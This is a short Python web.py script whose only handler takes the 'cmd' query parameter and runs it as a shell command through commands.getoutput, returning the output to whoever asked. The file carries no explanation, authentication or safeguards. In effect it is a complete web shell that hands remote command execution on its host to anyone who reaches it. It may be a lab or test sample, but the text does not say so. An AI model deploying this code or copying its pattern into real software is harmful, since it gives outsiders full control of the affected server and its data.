#encoding:utf-8

import web
import commands

urls = (
    '/', 'index'
)

class index:
    def GET(self):
        user_data = web.input()
        return  commands.getoutput(user_data.cmd)
        #return commands.getoutput("whoami")

if __name__ == "__main__":
    app = web.application(urls, globals())
    app.run()